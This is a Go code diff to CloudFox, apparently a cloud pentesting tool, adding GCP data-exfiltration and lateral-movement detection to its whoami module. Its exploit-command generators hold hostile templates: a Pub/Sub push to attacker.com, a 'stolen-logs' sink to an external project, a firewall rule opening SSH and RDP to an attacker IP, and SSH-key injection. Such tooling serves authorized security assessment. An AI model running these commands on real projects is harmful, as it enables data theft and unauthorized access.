@@ -6,9 +6,9 @@ import (
 	"strings"
 	"sync"
 
+	attackpathservice "github.com/BishopFox/cloudfox/gcp/services/attackpathService"
 	IAMService "github.com/BishopFox/cloudfox/gcp/services/iamService"
 	OAuthService "github.com/BishopFox/cloudfox/gcp/services/oauthService"
-	privescservice "github.com/BishopFox/cloudfox/gcp/services/privescService"
 	"github.com/BishopFox/cloudfox/globals"
 	"github.com/BishopFox/cloudfox/internal"
 	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
@@ -38,6 +38,8 @@ Default output:
 With --extended flag (adds):
 - Service accounts that can be impersonated
 - Privilege escalation opportunities
+- Data exfiltration capabilities (compute exports, logging sinks, database exports, etc.)
+- Lateral movement capabilities (VPC peering, OS Login, firewall modifications, etc.)
 - Exploitation commands
 
 With --groups flag:
@@ -129,21 +131,41 @@ type PrivilegeEscalationPath struct {
 	RequiredPerms  string // Specific permissions needed for this path
 }
 
+// DataExfilCapability represents a data exfiltration capability for the current identity
+type DataExfilCapability struct {
+	ProjectID   string
+	Permission  string
+	Category    string
+	RiskLevel   string
+	Description string
+}
+
+// LateralMoveCapability represents a lateral movement capability for the current identity
+type LateralMoveCapability struct {
+	ProjectID   string
+	Permission  string
+	Category    string
+	RiskLevel   string
+	Description string
+}
+
 // ------------------------------
 // Module Struct
 // ------------------------------
 type WhoAmIModule struct {
 	gcpinternal.BaseGCPModule
 
-	Identity             IdentityContext
-	RoleBindings         []RoleBinding
-	ImpersonationTargets []ImpersonationTarget
-	PrivEscPaths         []PrivilegeEscalationPath
-	DangerousPermissions []string
-	LootMap              map[string]*internal.LootFile
-	Extended             bool
-	ProvidedGroups       []string // Groups provided via --groups flag
-	mu                   sync.Mutex
+	Identity               IdentityContext
+	RoleBindings           []RoleBinding
+	ImpersonationTargets   []ImpersonationTarget
+	PrivEscPaths           []PrivilegeEscalationPath
+	DataExfilCapabilities  []DataExfilCapability
+	LateralMoveCapabilities []LateralMoveCapability
+	DangerousPermissions   []string
+	LootMap                map[string]*internal.LootFile
+	Extended               bool
+	ProvidedGroups         []string // Groups provided via --groups flag
+	mu                     sync.Mutex
 }
 
 // ------------------------------
@@ -243,9 +265,15 @@ func (m *WhoAmIModule) Execute(ctx context.Context, logger internal.Logger) {
 
 		// Step 5: Identify privilege escalation paths
 		m.identifyPrivEscPaths(ctx, logger)
+
+		// Step 6: Identify data exfiltration capabilities
+		m.identifyDataExfilCapabilities(ctx, logger)
+
+		// Step 7: Identify lateral movement capabilities
+		m.identifyLateralMoveCapabilities(ctx, logger)
 	}
 
-	// Step 6: Generate loot
+	// Step 8: Generate loot
 	m.generateLoot()
 
 	// Write output
@@ -680,7 +708,7 @@ func (m *WhoAmIModule) findImpersonationTargets(ctx context.Context, logger inte
 }
 
 // identifyPrivEscPaths identifies privilege escalation paths based on current permissions
-// Uses privescService for comprehensive analysis consistent with the privesc module
+// Uses attackpathService for comprehensive analysis consistent with the privesc module
 // Filters results to only show paths relevant to the current identity and their groups
 // Will use cached privesc data from context if available (e.g., from all-checks run)
 func (m *WhoAmIModule) identifyPrivEscPaths(ctx context.Context, logger internal.Logger) {
@@ -778,10 +806,10 @@ func (m *WhoAmIModule) identifyPrivEscPathsFromCache(cache *gcpinternal.PrivescC
 	}
 }
 
-// identifyPrivEscPathsFromAnalysis runs fresh privesc analysis using privescService
+// identifyPrivEscPathsFromAnalysis runs fresh privesc analysis using attackpathService
 func (m *WhoAmIModule) identifyPrivEscPathsFromAnalysis(ctx context.Context, relevantPrincipals map[string]bool, logger internal.Logger) {
-	// Use privescService for comprehensive privesc analysis
-	svc := privescservice.New()
+	// Use attackpathService for comprehensive privesc analysis
+	svc := attackpathservice.New()
 
 	// Build project names map
 	projectNames := make(map[string]string)
@@ -791,8 +819,8 @@ func (m *WhoAmIModule) identifyPrivEscPathsFromAnalysis(ctx context.Context, rel
 		}
 	}
 
-	// Run combined privesc analysis (org, folder, project levels)
-	result, err := svc.CombinedPrivescAnalysis(ctx, m.ProjectIDs, projectNames)
+	// Run combined attack path analysis with "privesc" filter
+	result, err := svc.CombinedAttackPathAnalysis(ctx, m.ProjectIDs, projectNames, "privesc")
 	if err != nil {
 		gcpinternal.HandleGCPError(err, logger, globals.GCP_WHOAMI_MODULE_NAME, "Could not analyze privilege escalation paths")
 		return
@@ -802,7 +830,7 @@ func (m *WhoAmIModule) identifyPrivEscPathsFromAnalysis(ctx context.Context, rel
 		return
 	}
 
-	// Filter and convert privescservice.PrivescPath to whoami's PrivilegeEscalationPath format
+	// Filter and convert attackpathservice.AttackPath to whoami's PrivilegeEscalationPath format
 	// Only include paths where the principal matches current identity or their groups
 	for _, path := range result.AllPaths {
 		// Check if this path's principal is relevant to the current identity
@@ -824,9 +852,9 @@ func (m *WhoAmIModule) identifyPrivEscPathsFromAnalysis(ctx context.Context, rel
 }
 
 // isDangerousRole checks if a role is considered dangerous
-// Uses the dangerous permissions list from privescService for consistency
+// Uses the dangerous permissions list from attackpathService for consistency
 func isDangerousRole(role string) bool {
-	// Roles that directly map to dangerous permissions from privescService
+	// Roles that directly map to dangerous permissions from attackpathService
 	dangerousRoles := []string{
 		// Owner/Editor - broad access
 		"roles/owner",
@@ -875,6 +903,235 @@ func isDangerousRole(role string) bool {
 	return false
 }
 
+// identifyDataExfilCapabilities identifies data exfiltration capabilities for the current identity
+// Uses unified cache if available, otherwise runs attackpathService for comprehensive analysis
+// Filters results to only show capabilities relevant to the current identity and their groups
+func (m *WhoAmIModule) identifyDataExfilCapabilities(ctx context.Context, logger internal.Logger) {
+	// Build set of principals to filter for (current identity + groups)
+	relevantPrincipals := make(map[string]bool)
+	relevantPrincipals[m.Identity.Email] = true
+	relevantPrincipals[strings.ToLower(m.Identity.Email)] = true
+	if m.Identity.Type == "serviceAccount" {
+		relevantPrincipals["serviceAccount:"+m.Identity.Email] = true
+		relevantPrincipals["serviceAccount:"+strings.ToLower(m.Identity.Email)] = true
+	} else {
+		relevantPrincipals["user:"+m.Identity.Email] = true
+		relevantPrincipals["user:"+strings.ToLower(m.Identity.Email)] = true
+	}
+	for _, group := range m.Identity.Groups {
+		if group.Email != "" {
+			relevantPrincipals[group.Email] = true
+			relevantPrincipals[strings.ToLower(group.Email)] = true
+			relevantPrincipals["group:"+group.Email] = true
+			relevantPrincipals["group:"+strings.ToLower(group.Email)] = true
+		}
+	}
+	relevantPrincipals["allUsers"] = true
+	relevantPrincipals["allAuthenticatedUsers"] = true
+
+	// Check if attack path cache is available from context (e.g., from all-checks run)
+	cache := gcpinternal.GetAttackPathCacheFromContext(ctx)
+	if cache != nil && cache.IsPopulated() {
+		logger.InfoM("Using cached exfil data", globals.GCP_WHOAMI_MODULE_NAME)
+		m.identifyDataExfilFromCache(cache, relevantPrincipals)
+	} else {
+		// No cache available, run fresh analysis
+		m.identifyDataExfilFromAnalysis(ctx, relevantPrincipals, logger)
+	}
+
+	if len(m.DataExfilCapabilities) > 0 {
+		logger.InfoM(fmt.Sprintf("[EXFIL] Found %d data exfiltration capability(s)", len(m.DataExfilCapabilities)), globals.GCP_WHOAMI_MODULE_NAME)
+	}
+}
+
+// identifyDataExfilFromCache extracts exfil capabilities from the cached data
+func (m *WhoAmIModule) identifyDataExfilFromCache(cache *gcpinternal.AttackPathCache, relevantPrincipals map[string]bool) {
+	for principal := range relevantPrincipals {
+		hasExfil, methods := cache.HasExfil(principal)
+		if !hasExfil {
+			// Also check with principal format
+			hasExfil, methods = cache.HasAttackPathForPrincipal(principal, gcpinternal.AttackPathExfil)
+		}
+		if !hasExfil {
+			continue
+		}
+
+		for _, method := range methods {
+			capability := DataExfilCapability{
+				ProjectID:   method.ScopeID,
+				Permission:  method.Method,
+				Category:    method.Category,
+				RiskLevel:   method.RiskLevel,
+				Description: method.Target,
+			}
+			m.DataExfilCapabilities = append(m.DataExfilCapabilities, capability)
+		}
+	}
+}
+
+// identifyDataExfilFromAnalysis runs fresh exfil analysis using attackpathService
+func (m *WhoAmIModule) identifyDataExfilFromAnalysis(ctx context.Context, relevantPrincipals map[string]bool, logger internal.Logger) {
+	// Use attackpathService for comprehensive exfil analysis
+	attackSvc := attackpathservice.New()
+
+	// Build project names map
+	projectNames := make(map[string]string)
+	for _, proj := range m.Identity.Projects {
+		if proj.DisplayName != "" {
+			projectNames[proj.ProjectID] = proj.DisplayName
+		}
+	}
+
+	// Run combined attack path analysis for exfil (org, folder, project, resource levels)
+	result, err := attackSvc.CombinedAttackPathAnalysis(ctx, m.ProjectIDs, projectNames, "exfil")
+	if err != nil {
+		gcpinternal.HandleGCPError(err, logger, globals.GCP_WHOAMI_MODULE_NAME, "Could not analyze data exfiltration capabilities")
+		return
+	}
+
+	if result == nil {
+		return
+	}
+
+	// Filter and convert to DataExfilCapability format
+	// Only include paths where the principal matches current identity or their groups
+	for _, path := range result.AllPaths {
+		if !relevantPrincipals[path.Principal] && !relevantPrincipals[strings.ToLower(path.Principal)] {
+			continue
+		}
+
+		// Determine project ID from scope
+		projectID := path.ProjectID
+		if projectID == "" {
+			// For org/folder level, show scope info instead
+			projectID = fmt.Sprintf("%s:%s", path.ScopeType, path.ScopeID)
+		}
+
+		capability := DataExfilCapability{
+			ProjectID:   projectID,
+			Permission:  path.Method,
+			Category:    path.Category,
+			RiskLevel:   path.RiskLevel,
+			Description: path.Description,
+		}
+		m.DataExfilCapabilities = append(m.DataExfilCapabilities, capability)
+	}
+}
+
+// identifyLateralMoveCapabilities identifies lateral movement capabilities for the current identity
+// Uses unified cache if available, otherwise runs attackpathService for comprehensive analysis
+// Filters results to only show capabilities relevant to the current identity and their groups
+func (m *WhoAmIModule) identifyLateralMoveCapabilities(ctx context.Context, logger internal.Logger) {
+	// Build set of principals to filter for (current identity + groups)
+	relevantPrincipals := make(map[string]bool)
+	relevantPrincipals[m.Identity.Email] = true
+	relevantPrincipals[strings.ToLower(m.Identity.Email)] = true
+	if m.Identity.Type == "serviceAccount" {
+		relevantPrincipals["serviceAccount:"+m.Identity.Email] = true
+		relevantPrincipals["serviceAccount:"+strings.ToLower(m.Identity.Email)] = true
+	} else {
+		relevantPrincipals["user:"+m.Identity.Email] = true
+		relevantPrincipals["user:"+strings.ToLower(m.Identity.Email)] = true
+	}
+	for _, group := range m.Identity.Groups {
+		if group.Email != "" {
+			relevantPrincipals[group.Email] = true
+			relevantPrincipals[strings.ToLower(group.Email)] = true
+			relevantPrincipals["group:"+group.Email] = true
+			relevantPrincipals["group:"+strings.ToLower(group.Email)] = true
+		}
+	}
+	relevantPrincipals["allUsers"] = true
+	relevantPrincipals["allAuthenticatedUsers"] = true
+
+	// Check if attack path cache is available from context (e.g., from all-checks run)
+	cache := gcpinternal.GetAttackPathCacheFromContext(ctx)
+	if cache != nil && cache.IsPopulated() {
+		logger.InfoM("Using cached lateral data", globals.GCP_WHOAMI_MODULE_NAME)
+		m.identifyLateralFromCache(cache, relevantPrincipals)
+	} else {
+		// No cache available, run fresh analysis
+		m.identifyLateralFromAnalysis(ctx, relevantPrincipals, logger)
+	}
+
+	if len(m.LateralMoveCapabilities) > 0 {
+		logger.InfoM(fmt.Sprintf("[LATERAL] Found %d lateral movement capability(s)", len(m.LateralMoveCapabilities)), globals.GCP_WHOAMI_MODULE_NAME)
+	}
+}
+
+// identifyLateralFromCache extracts lateral movement capabilities from the cached data
+func (m *WhoAmIModule) identifyLateralFromCache(cache *gcpinternal.AttackPathCache, relevantPrincipals map[string]bool) {
+	for principal := range relevantPrincipals {
+		hasLateral, methods := cache.HasLateral(principal)
+		if !hasLateral {
+			// Also check with principal format
+			hasLateral, methods = cache.HasAttackPathForPrincipal(principal, gcpinternal.AttackPathLateral)
+		}
+		if !hasLateral {
+			continue
+		}
+
+		for _, method := range methods {
+			capability := LateralMoveCapability{
+				ProjectID:   method.ScopeID,
+				Permission:  method.Method,
+				Category:    method.Category,
+				RiskLevel:   method.RiskLevel,
+				Description: method.Target,
+			}
+			m.LateralMoveCapabilities = append(m.LateralMoveCapabilities, capability)
+		}
+	}
+}
+
+// identifyLateralFromAnalysis runs fresh lateral movement analysis using attackpathService
+func (m *WhoAmIModule) identifyLateralFromAnalysis(ctx context.Context, relevantPrincipals map[string]bool, logger internal.Logger) {
+	// Use attackpathService for comprehensive lateral movement analysis
+	attackSvc := attackpathservice.New()
+
+	// Build project names map
+	projectNames := make(map[string]string)
+	for _, proj := range m.Identity.Projects {
+		if proj.DisplayName != "" {
+			projectNames[proj.ProjectID] = proj.DisplayName
+		}
+	}
+
+	// Run combined attack path analysis for lateral movement (org, folder, project, resource levels)
+	result, err := attackSvc.CombinedAttackPathAnalysis(ctx, m.ProjectIDs, projectNames, "lateral")
+	if err != nil {
+		gcpinternal.HandleGCPError(err, logger, globals.GCP_WHOAMI_MODULE_NAME, "Could not analyze lateral movement capabilities")
+		return
+	}
+
+	if result == nil {
+		return
+	}
+
+	// Filter and convert to LateralMoveCapability format
+	// Only include paths where the principal matches current identity or their groups
+	for _, path := range result.AllPaths {
+		if !relevantPrincipals[path.Principal] && !relevantPrincipals[strings.ToLower(path.Principal)] {
+			continue
+		}
+
+		// Determine project ID from scope
+		projectID := path.ProjectID
+		if projectID == "" {
+			// For org/folder level, show scope info instead
+			projectID = fmt.Sprintf("%s:%s", path.ScopeType, path.ScopeID)
+		}
+
+		capability := LateralMoveCapability{
+			ProjectID:   projectID,
+			Permission:  path.Method,
+			Category:    path.Category,
+			RiskLevel:   path.RiskLevel,
+			Description: path.Description,
+		}
+		m.LateralMoveCapabilities = append(m.LateralMoveCapabilities, capability)
+	}
+}
 
 // ------------------------------
 // Loot File Management
@@ -892,6 +1149,14 @@ func (m *WhoAmIModule) initializeLootFiles() {
 		m.LootMap["whoami-privesc"] = &internal.LootFile{
 			Name:     "whoami-privesc",
 			Contents: "# Privilege Escalation Paths\n# Generated by CloudFox\n# WARNING: Only use with proper authorization!\n\n",
+		}
+		m.LootMap["whoami-data-exfil"] = &internal.LootFile{
+			Name:     "whoami-data-exfil",
+			Contents: "# Data Exfiltration Capabilities\n# Generated by CloudFox\n# WARNING: Only use with proper authorization!\n\n",
+		}
+		m.LootMap["whoami-lateral-movement"] = &internal.LootFile{
+			Name:     "whoami-lateral-movement",
+			Contents: "# Lateral Movement Capabilities\n# Generated by CloudFox\n# WARNING: Only use with proper authorization!\n\n",
 		}
 	}
 }
@@ -949,6 +1214,90 @@ func (m *WhoAmIModule) generateLoot() {
 				path.Command,
 			)
 		}
+
+		// Data exfiltration capabilities loot
+		for _, cap := range m.DataExfilCapabilities {
+			m.LootMap["whoami-data-exfil"].Contents += fmt.Sprintf(
+				"## %s\n"+
+					"# Category: %s\n"+
+					"# Project: %s\n"+
+					"# Description: %s\n"+
+					"%s\n\n",
+				cap.Permission,
+				cap.Category,
+				cap.ProjectID,
+				cap.Description,
+				generateExfilExploitCmd(cap.Permission, cap.ProjectID),
+			)
+		}
+
+		// Lateral movement capabilities loot
+		for _, cap := range m.LateralMoveCapabilities {
+			m.LootMap["whoami-lateral-movement"].Contents += fmt.Sprintf(
+				"## %s\n"+
+					"# Category: %s\n"+
+					"# Project: %s\n"+
+					"# Description: %s\n"+
+					"%s\n\n",
+				cap.Permission,
+				cap.Category,
+				cap.ProjectID,
+				cap.Description,
+				generateLateralExploitCmd(cap.Permission, cap.ProjectID),
+			)
+		}
+	}
+}
+
+// generateExfilExploitCmd generates an exploit command for a data exfil permission
+func generateExfilExploitCmd(permission, projectID string) string {
+	switch permission {
+	case "compute.images.create":
+		return fmt.Sprintf("gcloud compute images create exfil-image --source-disk=DISK_NAME --source-disk-zone=ZONE --project=%s", projectID)
+	case "compute.snapshots.create":
+		return fmt.Sprintf("gcloud compute snapshots create exfil-snapshot --source-disk=DISK_NAME --source-disk-zone=ZONE --project=%s", projectID)
+	case "logging.sinks.create":
+		return fmt.Sprintf("gcloud logging sinks create exfil-sink pubsub.googleapis.com/projects/EXTERNAL_PROJECT/topics/stolen-logs --project=%s", projectID)
+	case "cloudsql.instances.export":
+		return fmt.Sprintf("gcloud sql export sql INSTANCE_NAME gs://BUCKET/export.sql --database=DB_NAME --project=%s", projectID)
+	case "pubsub.subscriptions.create":
+		return fmt.Sprintf("gcloud pubsub subscriptions create exfil-sub --topic=TOPIC_NAME --push-endpoint=https://attacker.com/collect --project=%s", projectID)
+	case "bigquery.tables.export":
+		return fmt.Sprintf("bq extract --destination_format=CSV '%s:DATASET.TABLE' gs://BUCKET/export.csv", projectID)
+	case "storagetransfer.jobs.create":
+		return fmt.Sprintf("gcloud transfer jobs create gs://SOURCE_BUCKET s3://DEST_BUCKET --project=%s", projectID)
+	case "secretmanager.versions.access":
+		return fmt.Sprintf("gcloud secrets versions access latest --secret=SECRET_NAME --project=%s", projectID)
+	case "storage.objects.get":
+		return fmt.Sprintf("gsutil cp gs://BUCKET/OBJECT ./local-file --project=%s", projectID)
+	default:
+		return fmt.Sprintf("# Permission: %s - Refer to GCP documentation", permission)
+	}
+}
+
+// generateLateralExploitCmd generates an exploit command for a lateral movement permission
+func generateLateralExploitCmd(permission, projectID string) string {
+	switch permission {
+	case "compute.networks.addPeering":
+		return fmt.Sprintf("gcloud compute networks peerings create lateral-peering --network=NETWORK_NAME --peer-network=projects/TARGET_PROJECT/global/networks/TARGET_NETWORK --project=%s", projectID)
+	case "compute.instances.osLogin":
+		return fmt.Sprintf("gcloud compute ssh INSTANCE_NAME --zone=ZONE --project=%s", projectID)
+	case "compute.instances.osAdminLogin":
+		return fmt.Sprintf("gcloud compute ssh INSTANCE_NAME --zone=ZONE --project=%s  # Then: sudo su", projectID)
+	case "compute.instances.setMetadata":
+		return fmt.Sprintf("gcloud compute instances add-metadata INSTANCE_NAME --zone=ZONE --metadata=ssh-keys=\"user:$(cat ~/.ssh/id_rsa.pub)\" --project=%s", projectID)
+	case "compute.projects.setCommonInstanceMetadata":
+		return fmt.Sprintf("gcloud compute project-info add-metadata --metadata=ssh-keys=\"user:$(cat ~/.ssh/id_rsa.pub)\" --project=%s", projectID)
+	case "container.clusters.getCredentials":
+		return fmt.Sprintf("gcloud container clusters get-credentials CLUSTER_NAME --zone=ZONE --project=%s", projectID)
+	case "container.pods.exec":
+		return "kubectl exec -it POD_NAME -- /bin/sh"
+	case "compute.firewalls.create":
+		return fmt.Sprintf("gcloud compute firewall-rules create allow-lateral --network=NETWORK_NAME --allow=tcp:22,tcp:3389 --source-ranges=ATTACKER_IP/32 --project=%s", projectID)
+	case "iap.tunnelInstances.accessViaIAP":
+		return fmt.Sprintf("gcloud compute start-iap-tunnel INSTANCE_NAME PORT --zone=ZONE --project=%s", projectID)
+	default:
+		return fmt.Sprintf("# Permission: %s - Refer to GCP documentation", permission)
 	}
 }
 
@@ -1197,6 +1546,58 @@ func (m *WhoAmIModule) buildTables() []internal.TableFile {
 				Name:   "whoami-privesc",
 				Header: privescHeader,
 				Body:   privescBody,
+			})
+		}
+
+		// Data exfiltration capabilities table
+		if len(m.DataExfilCapabilities) > 0 {
+			exfilHeader := []string{
+				"Project ID",
+				"Permission",
+				"Category",
+				"Description",
+			}
+
+			var exfilBody [][]string
+			for _, cap := range m.DataExfilCapabilities {
+				exfilBody = append(exfilBody, []string{
+					cap.ProjectID,
+					cap.Permission,
+					cap.Category,
+					cap.Description,
+				})
+			}
+
+			tables = append(tables, internal.TableFile{
+				Name:   "whoami-data-exfil",
+				Header: exfilHeader,
+				Body:   exfilBody,
+			})
+		}
+
+		// Lateral movement capabilities table
+		if len(m.LateralMoveCapabilities) > 0 {
+			lateralHeader := []string{
+				"Project ID",
+				"Permission",
+				"Category",
+				"Description",
+			}
+
+			var lateralBody [][]string
+			for _, cap := range m.LateralMoveCapabilities {
+				lateralBody = append(lateralBody, []string{
+					cap.ProjectID,
+					cap.Permission,
+					cap.Category,
+					cap.Description,
+				})
+			}
+
+			tables = append(tables, internal.TableFile{
+				Name:   "whoami-lateral-movement",
+				Header: lateralHeader,
+				Body:   lateralBody,
 			})
 		}
 	}
